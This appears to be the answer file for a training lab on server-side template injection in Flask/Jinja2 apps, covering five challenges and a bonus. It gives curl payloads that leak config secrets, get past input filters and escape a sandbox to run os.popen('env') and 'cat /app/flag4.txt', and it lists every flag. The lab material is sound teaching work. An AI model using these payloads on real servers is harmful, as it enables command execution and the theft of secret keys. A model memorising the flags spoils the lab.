@@ -1,0 +1,100 @@
+===============================================================================
+  SSTI Lab Solutions (Port 5003)
+===============================================================================
+
+CHALLENGE 1: Basic SSTI — Secret Key Leak
+Flag: FLAG{sst1_s3cr3t_k3y_l34k}
+
+  The /greeting endpoint renders user input directly in a template string:
+    render_template_string(f"Hello {name}! Welcome...")
+
+  curl --globoff "http://localhost:5003/greeting?name={{config.SECRET_KEY}}"
+
+  Alternative payloads:
+    ?name={{7*7}}                          (returns 49 — confirms SSTI)
+    ?name={{config.items()}}               (dumps entire config)
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Filter Bypass SSTI — {% %} Tags
+Flag: FLAG{sst1_f1lt3r_byp4ss}
+
+  The /profile endpoint strips {{ and }} from input. But {% %} tags
+  (Jinja2 statement blocks) are not filtered.
+
+  curl -X POST http://localhost:5003/profile \
+    -d "bio={%25print(config.FILTER_FLAG)%25}"
+
+  (Note: %25 = URL-encoded %)
+
+  Alternative:
+    bio={%for x in [config.FILTER_FLAG]%}{%print(x)%}{%endfor%}
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Blind SSTI — Oracle Endpoint
+Flag: FLAG{bl1nd_sst1_ch3ck}
+
+  The /feedback endpoint renders the template but does NOT show the
+  output. Instead, use the /feedback/check oracle:
+
+  Step 1: Submit feedback to confirm SSTI works (timing/error based)
+  Step 2: Use the oracle to guess the flag character by character:
+
+  curl "http://localhost:5003/feedback/check?guess=FLAG{bl1nd_sst1_ch3ck}"
+
+  The oracle returns "Correct!" when the guess matches BLIND_FLAG.
+
+  Or brute-force character by character using the oracle endpoint.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Sandbox Escape — Object Traversal
+Flag: FLAG{sst1_0bj3ct_tr4v3rs4l}
+
+  The /sandbox endpoint blocks the word "config" (case-insensitive regex).
+  Bypass via Jinja2 object traversal to access config indirectly.
+
+  Using lipsum (Jinja2 global):
+  curl --globoff "http://localhost:5003/sandbox?expr={{lipsum.__globals__['os'].popen('env').read()}}"
+
+  Using string class traversal:
+  curl --globoff "http://localhost:5003/sandbox?expr={{''.__class__.__mro__[1].__subclasses__()}}"
+
+  Accessing the flag via attribute access without "config":
+  curl --globoff "http://localhost:5003/sandbox?expr={{request.application.__self__._get_data_for_json.__globals__['current_app'].config['SANDBOX_FLAG']}}"
+
+  Or use string concatenation to bypass the word filter:
+  curl --globoff "http://localhost:5003/sandbox?expr={{self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /app/flag4.txt').read()}}"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Debug Mode Information Leak
+Flag: FLAG{sst1_d3bug_m0d3}
+
+  The /debug endpoint intentionally triggers a Jinja2 error with a
+  full traceback that leaks configuration values.
+
+  curl http://localhost:5003/debug
+
+  The error traceback/page displays:
+  - app.config['DEBUG_FLAG'] = FLAG{sst1_d3bug_m0d3}
+  - os.environ['SSTI_FLAG'] = FLAG{sst1_3nv_l34k_d3bug}
+
+  Both flags are visible in the debug output without any injection.
+
+-------------------------------------------------------------------------------
+
+BONUS: Environment Variable Leak
+Flag: FLAG{sst1_3nv_l34k_d3bug}
+
+  Visible on the /debug page (see Challenge 5).
+
+  Or extract via SSTI on /greeting:
+  curl --globoff "http://localhost:5003/greeting?name={{config.get('SSTI_FLAG','not_here')}}"
+
+  Or via the os module:
+  curl --globoff "http://localhost:5003/greeting?name={{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].environ['SSTI_FLAG']}}"
+  (where X is the index of a subclass that imports os)
+
+===============================================================================
